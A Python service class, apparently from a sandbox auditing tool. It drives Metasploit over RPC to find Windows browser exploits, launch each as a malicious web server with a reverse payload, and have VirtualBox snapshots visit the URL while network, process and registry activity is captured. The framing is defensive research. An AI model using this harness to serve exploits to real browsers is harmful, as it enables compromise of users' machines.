import datetime
import logging

from pymetasploit3.msfrpc import MsfRpcClient

from constants import DEFAULT_MS_HOST, DEFAULT_MS_LPORT, DEFAULT_MS_PAYLOAD, DEFAULT_MS_SRVHOST, DEFAULT_MS_SRVPORT, DEFAULT_MS_URIPATH
from data import ScriptArguments, VBoxWorkflowConfiguration
from services import IScriptHandlingService
from services.metasploit.datatype import MaliciousWebServerMetadata, MetasploitClientOptions, MetasploitSearchResult
from services.metasploit.helper import MetasploitHelper
from services.vbox import VirtualBoxService


class MetasploitScriptHandlingService(IScriptHandlingService):
    
    def __init__(self) -> None:
        self._logger = logging.getLogger(__name__)
        self._client: MsfRpcClient | None = None
    
    def execute_script(self, args) -> bool:
        try:
            client_options = MetasploitClientOptions(
                host=args.ms_rpc_host, 
                port=args.ms_rpc_port, 
                password=args.ms_rpc_password,
                ssl=args.ms_rpc_ssl,
                uri=args.ms_rpc_uri
            )
            self._client = MetasploitHelper.create_client(client_options)

            vbox_service = VirtualBoxService(
                user=args.user, 
                password=args.password, 
                base_vm_name=args.vm, 
                vbox_path=args.vbox_path, 
            )

            search_results = self._get_browser_exploits(from_date=args.ms_from_date, to_date=args.ms_to_date)
            self._logger.info(f"Found {len(search_results)} browser exploits.")

            results_to_run = search_results
            if args.max_url:
                results_to_run = search_results[:args.max_url]
            self._logger.info(f"Launching {len(results_to_run)} audits...")
            
            for result in results_to_run:
                server_metadata = self._deploy_malicious_webserver(module_fullname=result.fullname, 
                                                                host=args.ms_host, 
                                                                lport=args.ms_lport,
                                                                srvport=args.ms_srvport,
                                                                payload=args.ms_payload)
                if server_metadata is None:
                    continue
                self._logger.info(f"{result.fullname} with payload/{args.ms_payload} (Job ID: {server_metadata.job_id}). Server started! Target URL: {server_metadata.url}")
                self._logger.debug(self._client.jobs.info(server_metadata.job_id))

                # Configure options for an audit
                script_args = ScriptArguments(
                    script_path=args.script_path, 
                    target_url=server_metadata.url,
                    duration=args.duration, 
                    output_path=args.output, 
                    interface_num=args.iface, 
                    tshark_fields=args.tshark_fields, 
                    tshark_path=args.tshark_path, 
                    procmon_path=args.procmon_path, 
                    regview_path=args.reg_path, 
                )
                config = VBoxWorkflowConfiguration(
                    snapshot=args.snapshot, 
                    base_host_path= args.base_host_path, 
                    boot_timeout= args.boot_timeout, 
                    execution_timeout= int(args.execution_timeout), 
                    headless= bool(args.headless), 
                    script_args=script_args
                )

                # Run the audit
                success, path = vbox_service.run_workflow(config=config)
                self._logger.info(f"Audit at {path} completed: {'SUCCESS' if success else 'FAILED'}")

                # Stop the web server after the audit completed
                self._client.jobs.stop(server_metadata.job_id)

            return True
        except Exception as e:
            self._logger.error(e)
            return False

    def _deploy_malicious_webserver(self, module_fullname: str, 
                                    host: str = DEFAULT_MS_HOST, lport: int = DEFAULT_MS_LPORT,
                                    srvhost: str = DEFAULT_MS_SRVHOST, srvport: int = DEFAULT_MS_SRVPORT, 
                                    uri_path: str = DEFAULT_MS_URIPATH, payload: str = DEFAULT_MS_PAYLOAD) -> MaliciousWebServerMetadata | None:
        if self._client is None:
            raise ValueError("Metasploit client not initialized.")
        
        # Configure the exploit
        _, module_path = MetasploitHelper.get_module_type(module_fullname)
        exploit_module = self._client.modules.use("exploit", module_path)

        support_options = ['SRVHOST', 'SRVPORT', 'URIPATH'] # Requires to deploy webserver automatically
        is_supported = all(option in exploit_module.options for option in support_options)
        if not is_supported:
            self._logger.info(f"Exploit {module_fullname} cannot automatically deploy as a malicious webserver. Skipping...")
            return None
        exploit_module.update({
            'SRVHOST': srvhost,
            'SRVPORT': srvport,
            'URIPATH': uri_path,
            'VERBOSE': True,
            'DisablePayloadHandler': True,
        })

        # Configure the payload
        payload_module = self._client.modules.use('payload', payload)
        payload_module['LHOST'] = host
        payload_module['LPORT'] = lport

        # Execute the exploit
        execution_result = exploit_module.execute(payload=payload_module)

        job_id = execution_result['job_id']
        if job_id is None:
            raise ValueError(f"Failed to execute the exploit {module_fullname} with payload {payload}.")

        return MaliciousWebServerMetadata(
            job_id=job_id,
            url=f"http://{host}:{srvport}{uri_path}",
            host=host,
            port=srvport,
            uri_path=uri_path,
            payload=payload
        )


    def _get_browser_exploits(self, platform: str = 'windows', from_date: datetime.datetime | None = None, to_date: datetime.datetime | None = None):
        if self._client is None:
            raise ValueError("Metasploit client not initialized.")

        # Search specifically for browser-based exploits
        raw_results = self._client.call('module.search', [f'type:exploit browser platform:{platform}'])
        browser_results: list[MetasploitSearchResult] = [MetasploitSearchResult(**e) for e in raw_results if type(e) is dict]

        # Sort and filter as before
        sorted_browser_exploits = sorted(browser_results, key=lambda x: x.disclosuredate, reverse=True)

        # Filter by date if provided
        if from_date is not None:
            sorted_browser_exploits = [e for e in sorted_browser_exploits if datetime.datetime.strptime(e.disclosuredate, "%Y-%m-%d") >= from_date]
        if to_date is not None:
            sorted_browser_exploits = [e for e in sorted_browser_exploits if datetime.datetime.strptime(e.disclosuredate, "%Y-%m-%d") <= to_date]
        return sorted_browser_exploits
